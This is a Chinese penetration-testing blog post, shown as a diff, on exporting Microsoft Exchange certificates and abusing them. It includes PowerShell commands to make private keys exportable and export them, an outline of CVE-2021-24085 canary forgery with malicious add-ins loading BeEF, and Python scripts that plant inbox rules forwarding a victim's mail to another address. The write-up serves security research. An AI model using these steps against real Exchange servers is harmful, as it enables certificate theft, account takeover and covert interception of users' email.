@@ -1,0 +1,345 @@
+I"+:<h2 id="0x00-前言">0x00 前言</h2>
+<hr />
+
+<p>在上篇文章《Exchange admin center(EAC)开发指南》开源了代码<a href="https://github.com/3gstudent/Homework-of-Python/blob/master/eacManage.py">eacManage</a>，实现了添加邮箱用户、设置邮箱用户的权限和导出所有邮箱用户列表的功能，本文将要添加证书导出的功能，记录开发细节，分析利用思路。</p>
+
+<h2 id="0x01-简介">0x01 简介</h2>
+<hr />
+
+<p>本文将要介绍以下内容：</p>
+
+<ul>
+  <li>Exchange证书介绍</li>
+  <li>Exchange证书的导出方法</li>
+  <li>Exchange证书的利用</li>
+</ul>
+
+<h2 id="0x02-exchange证书介绍">0x02 Exchange证书介绍</h2>
+<hr />
+
+<p>参考资料：</p>
+
+<p>https://docs.microsoft.com/en-us/exchange/architecture/client-access/certificates?view=exchserver-2019#certificates-in-exchange</p>
+
+<p>Exchange服务器默认创建以下三个证书：</p>
+
+<ul>
+  <li>Microsoft Exchange，用于加密Exchange服务器、同一计算机上的Exchange服务和从客户端访问服务代理到邮箱服务器上的后端服务的客户端连接之间的内部通信</li>
+  <li>Microsoft Exchange Server Auth Certificate，用于OAuth服务器间身份验证和集成</li>
+  <li>WMSVC，此Windows自签名证书由IIS中的Web管理服务使用，用于启用远程管理Web服务器及其关联的网站和应用程序</li>
+</ul>
+
+<p>简单理解：</p>
+
+<p>Exchange的网络通信数据使用Microsoft Exchange证书进行加密</p>
+
+<p>身份验证功能需要使用Microsoft Exchange Server Auth Certificate证书，例如生成访问ECP服务时的参数<code class="language-plaintext highlighter-rouge">msExchEcpCanary</code></p>
+
+<p><strong>补充：</strong></p>
+
+<p>修改Exchange网络通信数据使用的证书位置：</p>
+
+<p><strong>IIS Manager</strong> -&gt; <strong>Sites</strong> -&gt; <strong>Exchange BackEnd</strong> -&gt; <strong>Bindings…</strong> -&gt; <strong>444</strong> -&gt; <strong>Edit…</strong> -&gt; <strong>SSL certificate</strong></p>
+
+<p>如下图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2021-5-12/1-1.png" alt="Alt text" /></p>
+
+<h2 id="0x03-exchange证书的导出方法">0x03 Exchange证书的导出方法</h2>
+<hr />
+
+<h3 id="1通过exchange-admin-centereac进行界面操作">1.通过Exchange admin center(EAC)进行界面操作</h3>
+
+<p>需要在<code class="language-plaintext highlighter-rouge">servers</code>-&gt;<code class="language-plaintext highlighter-rouge">certificates</code>页面下进行操作</p>
+
+<h3 id="2python实现">2.Python实现</h3>
+
+<p>具体的POST数据包格式如下：</p>
+
+<h4 id="1获得每个证书的thumbprint">(1)获得每个证书的Thumbprint</h4>
+
+<p>请求url：/ecp/DDI/DDIService.svc/GetList</p>
+
+<p>参数：</p>
+
+<ul>
+  <li>msExchEcpCanary</li>
+  <li>schema</li>
+</ul>
+
+<p>数据格式：application/json</p>
+
+<p>发送内容：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>{
+    "filter":
+    {
+        "Parameters":
+        {
+            "__type":
+                "JsonDictionaryOfanyType:#Microsoft.Exchange.Management.ControlPanel",
+                "SelectedView":"*"
+        }
+    },
+    "sort":{}
+}
+</code></pre></div></div>
+
+<h4 id="2导出证书">(2)导出证书</h4>
+
+<p>请求url：/ecp/DDI/DDIService.svc/SetObject</p>
+
+<p>参数：</p>
+
+<ul>
+  <li>msExchEcpCanary</li>
+  <li>schema</li>
+</ul>
+
+<p>数据格式：application/json</p>
+
+<p>发送内容：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>{
+    "identity":
+    {
+        "__type":"Identity:ECP",
+        "DisplayName":"",
+        "RawIdentity":&lt;Thumbprint&gt;
+    },
+    "properties":
+    {
+        "Parameters":
+        {
+            "__type":
+                "JsonDictionaryOfanyType:#Microsoft.Exchange.Management.ControlPanel",
+                "PlainPassword":&lt;pfxPassword&gt;,
+                "FileName":&lt;savePath&gt;
+        }
+    }
+}
+</code></pre></div></div>
+
+<p>完整的实现代码已上传至github，地址如下：</p>
+
+<p>https://github.com/3gstudent/Homework-of-Python/blob/master/eacManage.py</p>
+
+<h3 id="3通过exchange-management-shell执行powershell命令">3.通过Exchange Management Shell执行Powershell命令</h3>
+
+<p>参考资料：</p>
+
+<p>https://docs.microsoft.com/en-us/exchange/architecture/client-access/export-certificates?view=exchserver-2019</p>
+
+<p>列出所有证书：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Get-ExchangeCertificate |fl
+</code></pre></div></div>
+
+<p>导出指定证书：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Export-ExchangeCertificate -Thumbprint 5E3D84095391DB650FFC0EF27074B238B3798FB1 -FileName 'C:\a.pfx' -BinaryEncoded -Password (ConvertTo-SecureString -String 'P@ssw0rd1' -AsPlainText -Force)
+</code></pre></div></div>
+
+<p>名称为Microsoft Exchange的证书默认无法使用EAC或Powershell导出，错误提示：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>A special Rpc error occurs on server XXXX: The private key couldn't be exported as PKCS-12. It either couldn't be accessed or isn't exportable.
+</code></pre></div></div>
+
+<p>这是因为该证书的PrivateKeyExportable属性为FALSE</p>
+
+<h4 id="解决方法生成新的可导出证书替换原证书">解决方法：生成新的可导出证书替换原证书</h4>
+
+<p>参考资料：</p>
+
+<p>https://docs.microsoft.com/en-us/exchange/architecture/client-access/certificate-procedures?view=exchserver-2019</p>
+
+<h4 id="1定位证书">(1)定位证书</h4>
+
+<p>访问OWA页面，查看证书，获得Thumbprint，如下图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2021-5-12/2-1.png" alt="Alt text" /></p>
+
+<p>例如测试环境的证书Thumbprint为<code class="language-plaintext highlighter-rouge">5C1F5866F2408CFB8CCD7B66BECBDF99BC279042</code></p>
+
+<h4 id="2生成新的证书">(2)生成新的证书</h4>
+
+<p>通过Exchange Management Shell执行Powershell命令:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Get-ExchangeCertificate -Thumbprint 5C1F5866F2408CFB8CCD7B66BECBDF99BC279042 | New-ExchangeCertificate -Force -PrivateKeyExportable $true
+</code></pre></div></div>
+
+<p>返回结果：<code class="language-plaintext highlighter-rouge">5E3D84095391DB650FFC0EF27074B238B3798FB1</code>，如下图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2021-5-12/2-2.png" alt="Alt text" /></p>
+
+<h4 id="3-添加证书对iis服务器的权限">(3) 添加证书对IIS服务器的权限</h4>
+
+<p>通过Exchange Management Shell执行Powershell命令:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Enable-ExchangeCertificate -Thumbprint 5E3D84095391DB650FFC0EF27074B238B3798FB1 -Services POP,IMAP,IIS,SMTP
+</code></pre></div></div>
+
+<p>如下图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2021-5-12/2-3.png" alt="Alt text" /></p>
+
+<h4 id="4查看新证书">(4)查看新证书</h4>
+
+<p>刷新OWA页面，发现证书已更新，如下图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2021-5-12/2-4.png" alt="Alt text" /></p>
+
+<h4 id="5导出证书">(5)导出证书</h4>
+
+<p>通过Exchange Management Shell执行Powershell命令:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Export-ExchangeCertificate -Thumbprint 5E3D84095391DB650FFC0EF27074B238B3798FB1 -FileName 'C:\a.pfx' -BinaryEncoded -Password (ConvertTo-SecureString -String 'P@ssw0rd1' -AsPlainText -Force)
+</code></pre></div></div>
+
+<h2 id="0x04-exchange证书的利用">0x04 Exchange证书的利用</h2>
+<hr />
+
+<h3 id="1解密exchange的通信数据">1.解密Exchange的通信数据</h3>
+
+<p>需要导出Microsoft Exchange证书</p>
+
+<p>详情可参考之前的文章<a href="https://3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-Pass-the-Hash-with-Exchange-Web-Service">《渗透技巧——Pass the Hash with Exchange Web Service》</a></p>
+
+<h3 id="2cve-2021-24085">2.CVE-2021-24085</h3>
+
+<p>需要导出Microsoft Exchange Server Auth Certificate证书</p>
+
+<p>利用Microsoft Exchange Server Auth Certificate证书，可以使用<a href="https://github.com/sourceincite/CVE-2021-24085/blob/main/YellowCanary/Poc/Program.cs">YellowCanary</a>生成指定SID用户登录ECP时使用的参数<code class="language-plaintext highlighter-rouge">msExchEcpCanary</code></p>
+
+<p>未打补丁<a href="https://support.microsoft.com/en-us/topic/description-of-the-security-update-for-microsoft-exchange-server-2019-and-2016-february-9-2021-kb4602269-2f3c3a74-094b-6669-2ea0-025101d11f1a">KB4602269</a>的Exchange服务器在校验身份时，只判断了参数<code class="language-plaintext highlighter-rouge">msExchEcpCanary</code>是否正确，未对Cookie进行验证，这就导致了攻击者获得Microsoft Exchange Server Auth Certificate证书后，可以生成任意用户(已知SID)的<code class="language-plaintext highlighter-rouge">msExchEcpCanary</code>参数，获得邮箱用户的ECP控制权限</p>
+
+<p>获得邮箱用户的ECP控制权限后，在利用上有以下思路：</p>
+
+<h4 id="1上传恶意插件">(1)上传恶意插件</h4>
+
+<p>参考资料：</p>
+
+<p>https://docs.microsoft.com/en-us/office/dev/add-ins/tutorials/outlook-tutorial</p>
+
+<p>开发带有特定功能的Office Web Add-ins，能够读取用户的邮件内容并加载浏览器攻击框架BeEF</p>
+
+<p>限制条件：</p>
+
+<p>Office Web Add-ins需要在Outlook下使用，通过owa读取邮件不会加载Office Web Add-ins</p>
+
+<h4 id="2添加邮件转发规则">(2)添加邮件转发规则</h4>
+
+<p>将收件箱收到的邮件转发至另一用户</p>
+
+<p>正常功能的实现代码：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#!python3
+import requests
+import sys
+import warnings
+import urllib.parse
+warnings.filterwarnings("ignore")
+
+def LoginOWA(url, username, password):
+    session = requests.session()
+
+    print("[*] Try to login")
+    url1 = "https://" + url + "/owa/auth.owa"
+    headers = {
+        "User-Agent": "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
+    } 
+    payload = 'destination=https://%s/owa&amp;flags=4&amp;forcedownlevel=0&amp;username=%s&amp;password=%s&amp;passwordText=&amp;isUtf8=1'%(url, username, password)            
+
+    response = session.post(url1, headers=headers, data=payload, verify = False)
+
+    if 'X-OWA-CANARY' in response.cookies:
+        print("[+] Login success")     
+    else:
+        if "TimezoneSelectedCheck" in response.text:
+            print("[+] First login,try to set the display language and home time zone.");
+            cookie_obj = requests.cookies.create_cookie(domain=url,name="mkt",value="en-US")
+            session.cookies.set_cookie(cookie_obj)
+            owa_canary = session.cookies.get_dict()['X-OWA-CANARY']
+            url1 = "https://" + url + "/owa/lang.owa"
+            payload = 'destination=&amp;localeName=en-US&amp;tzid=Dateline+Standard+Time&amp;saveLanguageAndTimezone=1&amp;X-OWA-CANARY=' + owa_canary          
+            headers = {
+            "User-Agent": "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36",
+            "Content-Type": "application/x-www-form-urlencoded"
+            }
+            response = session.post(url1, headers=headers, data=payload, verify = False)            
+            if response.status_code == 200:
+                print("[+] Login success")
+            else:
+                print("[!] Login error: " + str(response.status_code))
+                exit(0)           
+        else:
+            print("[!] Login error")
+            exit(0)
+
+    url2 = "https://" + url + "/ecp/"
+    response = session.get(url2, headers=headers, verify = False)  
+    msExchEcpCanary = response.cookies['msExchEcpCanary']
+    print("    msExchEcpCanary:" + msExchEcpCanary)
+    return session,msExchEcpCanary
+
+def test():
+    url = "192.168.1.1"
+    user = "test1"
+    password = "Password123"
+    session,msExchEcpCanary = LoginOWA(url, user, password)
+    headers = {
+        "User-Agent": "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
+    }
+
+    p = {
+            "msExchEcpCanary": msExchEcpCanary
+        }
+    d = {"properties":{"ForwardTo":[{"RawIdentity":"test2@test.com","DisplayName":"test2","Address":"test2@test.com","AddressOrigin":0,"galContactGuid":"2cc82f35-2a13-449c-ab48-3843a7f2b615","RecipientFlag":0,"RoutingType":"SMTP","SMTPAddress":"test2@test.com"}],"Name":"1","StopProcessingRules":"true"}}
+
+    url3 = "https://" + url + "/ecp/RulesEditor/InboxRules.svc/NewObject"
+    response = session.post(url3, headers=headers, params=p, json=d, verify = False)
+    print(response.text)
+    
+if __name__ == '__main__':
+    test()
+</code></pre></div></div>
+
+<p>CVE-2021-24085的实现代码：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#!python3
+import requests
+import sys
+import warnings
+import urllib.parse
+warnings.filterwarnings("ignore")
+
+def test():
+    url = "192.168.1.1"
+    msExchEcpCanary = "P7btz10TmkSS6_-vY8gG2uAKFEimJNkItU-6jJR0jbZcA7rCcR0O5CYxhyrW5kI6oeKC-sUM3Vw."
+    headers = {
+        "User-Agent": "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
+    }
+
+    p = {
+            "msExchEcpCanary": msExchEcpCanary
+        }
+    d = {"properties":{"ForwardTo":[{"RawIdentity":"test2@test.com","DisplayName":"test2","Address":"test2@test.com","AddressOrigin":0,"galContactGuid":"2cc82f35-2a13-449c-ab48-3843a7f2b615","RecipientFlag":0,"RoutingType":"SMTP","SMTPAddress":"test2@test.com"}],"Name":"1","StopProcessingRules":"true"}}
+
+    url3 = "https://" + url + "/ecp/RulesEditor/InboxRules.svc/NewObject"
+    response = requests.post(url3, headers=headers, params=p, json=d, verify = False)
+    print(response.text)
+    
+if __name__ == '__main__':
+    test()
+</code></pre></div></div>
+
+<h2 id="0x05-小结">0x05 小结</h2>
+<hr />
+
+<p>本文对Exchange证书的导出方法和利用思路进行介绍，更新代码<a href="https://github.com/3gstudent/Homework-of-Python/blob/master/eacManage.py">eacManage</a>，添加导出证书的功能，记录实现细节。</p>
+
+<hr />
+
+<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>
+
+:ET
